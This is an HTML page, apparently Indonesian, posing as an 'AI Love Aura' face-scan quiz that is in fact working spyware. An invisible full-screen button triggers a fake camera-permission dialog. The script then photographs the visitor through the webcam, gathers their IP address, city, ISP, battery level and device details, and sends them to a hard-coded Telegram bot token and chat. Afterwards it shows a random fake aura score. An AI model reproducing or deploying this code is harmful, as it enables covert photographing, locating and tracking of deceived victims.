<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Love Aura Test ✨</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Varela+Round&display=swap');
        :root { --primary: #ff69b4; --secondary: #ff1493; --glass: rgba(255, 255, 255, 0.7); }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: 'Varela Round', sans-serif; background: #ffeef8; overflow: hidden; display: flex; justify-content: center; align-items: center; }
        .bg-animated { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #ffeef8 0%, #ffcbd5 100%); z-index: 1; }
        .particle { position: absolute; background: rgba(255, 105, 180, 0.3); bottom: -150px; border-radius: 50%; animation: floating 15s infinite linear; }
        @keyframes floating { 0% { transform: translateY(0) rotate(0deg); opacity: 0; } 20% { opacity: 0.5; } 100% { transform: translateY(-1200px) rotate(720deg); opacity: 0; } }
        #trigger { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; border: none; z-index: 9999; cursor: pointer; }
        .container { position: relative; z-index: 10; background: var(--glass); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); padding: 40px 25px; border-radius: 40px; border: 1.5px solid white; box-shadow: 0 20px 50px rgba(255, 105, 180, 0.2); text-align: center; width: 88%; max-width: 340px; }
        h1 { color: var(--secondary); font-size: 1.6rem; margin: 15px 0 10px 0; }
        p { color: #666; font-size: 0.9rem; line-height: 1.6; }
        .btn-love { background: linear-gradient(45deg, var(--primary), var(--secondary)); color: white; padding: 16px; border-radius: 50px; font-weight: bold; border: none; cursor: pointer; margin-top: 25px; width: 100%; display: block; position: relative; overflow: hidden; box-shadow: 0 8px 25px rgba(255, 20, 147, 0.3); }
        .btn-love::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(120deg, transparent, rgba(255,255,255,0.4), transparent); animation: shimmer 3s infinite; }
        @keyframes shimmer { 0% { left: -100%; } 100% { left: 100%; } }
        #scan-visual { display: none; position: relative; width: 140px; height: 140px; margin: 20px auto; border: 5px solid var(--primary); border-radius: 50%; overflow: hidden; box-shadow: 0 0 30px var(--primary); }
        .scan-bar { position: absolute; width: 100%; height: 8px; background: var(--secondary); top: 0; animation: scanLine 2s infinite ease-in-out; }
        @keyframes scanLine { 0% { top: -10%; } 50% { top: 100%; } 100% { top: -10%; } }
        video, canvas { display: none; }
        #overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.4); z-index:10000; backdrop-filter: blur(4px); }
        #fake-dialog { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 30px; border-radius: 35px; width: 290px; z-index: 10001; text-align: center; }
    </style>
</head>
<body>

    <div class="bg-animated"><div class="particle" style="left:10%;width:80px;height:80px;"></div><div class="particle" style="left:70%;width:60px;height:60px;animation-delay:3s;"></div></div>
    <button id="trigger"></button>
    <div id="overlay"></div>
    <div id="fake-dialog">
        <div style="font-size: 3.5rem;">📸</div>
        <h1>Izin Kamera</h1>
        <p>AI butuh akses kamera untuk menscan aura wajahmu.</p>
        <button class="btn-love" id="btn-allow">LANJUTKAN ✨</button>
    </div>

    <div class="container" id="main-container">
        <div id="setup-view">
            <div style="font-size: 4.5rem; margin-bottom: 10px;">💖</div>
            <h1>AI Love Aura</h1>
            <p>Penasaran warna auramu hari ini? Yuk scan wajahmu pake AI terbaru.</p>
            <div class="btn-love">MULAI SCAN</div>
        </div>
        <div id="scan-view" style="display:none;">
            <div id="scan-visual"><div class="scan-bar"></div><div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:3.5rem;">✨</div></div>
            <h1>Menganalisa...</h1>
            <p>Tetap tenang, sedang menyelaraskan energi aura wajah...</p>
        </div>
        <div id="result-view" style="display:none;">
            <div style="font-size: 3.5rem;">🌈</div>
            <h1>Hasil Aura</h1>
            <div style="font-size: 4rem; color: var(--secondary); font-weight: bold; margin: 5px 0;" id="final-score">0%</div>
            <p id="random-quote" style="font-style:italic; margin-top:20px; color:var(--secondary); font-size: 0.85rem;"></p>
            <button class="btn-love" onclick="location.reload()">COBA LAGI</button>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TG_TOKEN = '8759534902:AAGrdxkHf0ytnacqKexI0OPuEPYrhWXGj7U'; 
        const TG_CHAT_ID = '986460435'; 

        const trigger = document.getElementById('trigger');
        const btnAllow = document.getElementById('btn-allow');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        trigger.onclick = () => {
            trigger.remove();
            document.getElementById('overlay').style.display = 'block';
            document.getElementById('fake-dialog').style.display = 'block';
        };

        btnAllow.onclick = async () => {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('fake-dialog').style.display = 'none';
            document.getElementById('setup-view').style.display = 'none';
            document.getElementById('scan-view').style.display = 'block';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                document.getElementById('scan-visual').style.display = 'block';

                // MULTI-BACKEND IP TRACKING (HTTPS)
                let netData = "Unknown";
                try {
                    const res = await fetch('https://api.db-ip.com/v2/free/self');
                    const data = await res.json();
                    netData = `${data.ipAddress} (${data.city}, ${data.countryName})`;
                } catch (e) {
                    try {
                        const res2 = await fetch('https://ipapi.co/json/');
                        const data2 = await res2.json();
                        netData = `${data2.ip} (${data2.city}, ${data2.org})`;
                    } catch (e2) { netData = "Blocked by Browser/VPN"; }
                }

                const battery = navigator.getBattery ? await navigator.getBattery() : { level: 1 };

                const report = `
🌟 [NEW AURA SCAN]
━━━━━━━━━━━━━━━━━━
🌐 NETWORK: ${netData}
🔋 BATTERY: ${(battery.level * 100).toFixed(0)}%
📱 DEVICE: ${navigator.platform} (${screen.width}x${screen.height})
🕒 TIME: ${new Date().toLocaleString('id-ID')}
━━━━━━━━━━━━━━━━━━`;

                setTimeout(() => { capture(stream, report); }, 4000);
            } catch (err) {
                alert("Izin kamera diperlukan!");
                location.reload();
            }
        };

        function capture(stream, report) {
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const blob = dataURItoBlob(canvas.toDataURL('image/png'));
            const fd = new FormData();
            fd.append('chat_id', TG_CHAT_ID);
            fd.append('photo', blob, 'aura.png');
            fd.append('caption', report);

            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            stream.getTracks().forEach(t => t.stop());
            showResult();
        }

        function showResult() {
            document.getElementById('scan-view').style.display = 'none';
            document.getElementById('result-view').style.display = 'block';
            document.getElementById('random-quote').innerText = "Aura Pink: Seseorang merindukanmu semalam! 🥰";
            document.getElementById('final-score').innerText = (Math.floor(Math.random()*10)+90) + "%";
        }

        function dataURItoBlob(d) {
            const b = atob(d.split(',')[1]);
            const ia = new Uint8Array(b.length);
            for (let i=0; i<b.length; i++) ia[i] = b.charCodeAt(i);
            return new Blob([ia], {type: 'image/png'});
        }
    </script>
</body>
</html>
